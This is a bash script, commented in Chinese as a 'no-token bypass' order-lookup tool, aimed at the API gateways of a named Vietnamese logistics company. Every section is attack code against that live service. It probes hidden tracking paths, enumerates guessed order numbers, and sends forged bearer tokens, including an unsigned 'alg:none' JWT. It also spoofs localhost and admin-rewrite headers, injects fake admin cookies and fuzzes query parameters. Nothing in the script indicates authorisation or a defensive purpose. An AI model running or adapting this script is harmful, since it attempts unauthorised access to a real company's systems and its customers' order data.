#!/bin/bash
# 订单查询死磕脚本 - 无Token绕过

BASE="https://gw.vtpglobal.com.vn"
OMS="https://oms-api.vtpglobal.com.vn"

echo "[🔥] 第1波：公开订单跟踪页面"
# 1. 查找公开tracking页面（Web端）
for path in /track /tracking /order /order-tracking /trace /query /search /public/track /api/public/track /public/order; do
  echo "[+] $BASE$path"
  curl -sk "$BASE$path" -w "\nHTTP: %{http_code}\n" -m 3 2>/dev/null | head -10
done

echo ""
echo "[🔥] 第2波：不同HTTP方法测试"
# 2. 测试不同HTTP方法
for method in GET POST PUT OPTIONS; do
  echo "[+] $method /api/v1/order-tracking"
  curl -sk "$BASE/api/v1/order-tracking" -X $method -w "\nHTTP: %{http_code}\n" -m 3 2>/dev/null | head -5
done

echo ""
echo "[🔥] 第3波：伪造订单号格式"
# 3. 常见订单号格式
ORDERS=(
  "VTP2023110001"
  "VTP20231100001"
  "TP2023110001"
  "1000001"
  "100000001"
  "VN-1000001"
  "VN1000001"
  "202311-0001"
  "20231110001"
)

for order in "${ORDERS[@]}"; do
  echo "[+] 测试订单号: $order"
  curl -sk "$BASE/api/v1/order-tracking?orderNo=$order" -w "\nHTTP: %{http_code}\n" -m 3 | head -5
  curl -sk "$BASE/api/v1/order-tracking?id=$order" -w "\nHTTP: %{http_code}\n" -m 3 | head -5
  curl -sk "$BASE/api/v1/order-tracking?code=$order" -w "\nHTTP: %{http_code}\n" -m 3 | head -5
done

echo ""
echo "[🔥] 第4波：伪造Token"
# 4. 各种伪造token
FAKE_TOKENS=(
  "Bearer 123456"
  "Bearer admin"
  "Bearer test"
  "Bearer null"
  "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
  "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
  "token=123456"
  "123456"
)

for token in "${FAKE_TOKENS[@]}"; do
  echo "[+] Token: ${token:0:30}..."
  curl -sk "$BASE/api/v1/order-tracking?id=1000001" \
    -H "Authorization: $token" -w "\nHTTP: %{http_code}\n" -m 3 | head -5
done

echo ""
echo "[🔥] 第5波：Header伪造组合"
# 5. 组合header伪造
curl -sk "$BASE/api/v1/order-tracking?id=1000001" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Original-URL: /admin/order-tracking" \
  -H "X-Rewrite-URL: /admin/order-tracking" \
  -H "User-Agent: ViettelPost-App/1.0.21" \
  -H "X-App-Version: 1.0.21" \
  -H "X-Platform: android" \
  -w "\nHTTP: %{http_code}\n" | head -10

echo ""
echo "[🔥] 第6波：Cookie注入"
# 6. Cookie注入
curl -sk "$BASE/api/v1/order-tracking?id=1000001" \
  -b "admin=true;role=admin;isAdmin=1;authenticated=true;token=valid" \
  -w "\nHTTP: %{http_code}\n" | head -10

echo ""
echo "[🔥] 第7波：URL参数组合"
# 7. 各种参数组合
PARAMS=(
  "id=1&key=test"
  "orderNo=VTP1000001&apiKey=test"
  "code=1000001&public=true"
  "trackingNo=1000001&source=web"
  "billCode=1000001"
  "orderCode=1000001"
  "waybillNo=1000001"
)

for param in "${PARAMS[@]}"; do
  echo "[+] $param"
  curl -sk "$BASE/api/v1/order-tracking?$param" -w "\nHTTP: %{http_code}\n" -m 3 | head -5
done
